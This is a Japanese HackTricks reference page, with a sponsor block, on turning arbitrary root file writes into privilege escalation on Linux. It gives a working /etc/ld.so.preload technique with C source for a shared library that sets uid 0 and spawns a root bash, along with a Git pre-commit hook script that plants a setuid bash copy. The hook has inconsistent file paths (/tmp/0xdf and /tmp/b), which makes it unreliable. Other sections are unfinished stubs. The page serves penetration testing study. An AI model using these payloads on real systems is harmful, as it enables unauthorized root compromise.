# ルートへの任意のファイル書き込み

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学びましょう</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする**.**
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する。

</details>

### /etc/ld.so.preload

このファイルは **`LD_PRELOAD`** 環境変数のように振る舞いますが、**SUID バイナリ** でも機能します。\
作成または変更できれば、実行されるバイナリごとに **ロードされるライブラリへのパス** を追加することができます。

例: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git フック

[**Git フック**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)は、コミットが作成されたとき、マージが行われたときなど、gitリポジトリでさまざまな**イベント**で**実行**される**スクリプト**です。したがって、特権のあるスクリプトまたはユーザーがこれらのアクションを頻繁に実行し、`.git`フォルダに**書き込む**ことが可能であれば、これを**特権昇格**に利用できます。

たとえば、新しいコミットが作成されるたびに常に実行されるように、gitリポジトリ内の`.git/hooks`にスクリプトを**生成**することが可能です：

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt\_misc

`/proc/sys/fs/binfmt_misc`にあるファイルは、どのバイナリがどの種類のファイルを実行するかを示しています。これを悪用して、一般的なファイルタイプが開かれたときに逆シェルを実行する方法を調査してください。
